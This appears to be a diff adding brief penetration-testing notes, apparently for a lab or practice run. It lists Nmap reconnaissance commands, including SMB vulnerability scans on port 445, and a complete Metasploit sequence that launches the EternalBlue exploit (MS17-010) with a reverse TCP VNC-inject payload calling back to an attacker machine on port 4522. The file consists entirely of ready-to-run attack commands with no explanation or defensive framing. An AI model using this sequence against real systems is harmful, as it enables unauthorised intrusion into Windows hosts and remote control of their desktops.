@@ -1,0 +1,15 @@
+# Nmap Scans
+nmap <TARGET-IP> -A
+nmap <TARGET-IP> -p 445 -sV --script smb-vuln-*
+
+# Metasploit
+msfconsole
+search CVE-2017-0143
+use exploit/windows/smb/ms17_010_eternalblue
+show payloads
+set payload windows/x64/vncinject/reverse_tcp
+set RHOSTS <target_IP>
+set LHOST <kali_IP>
+set LPORT 4522
+set VIEWONLY false
+exploit
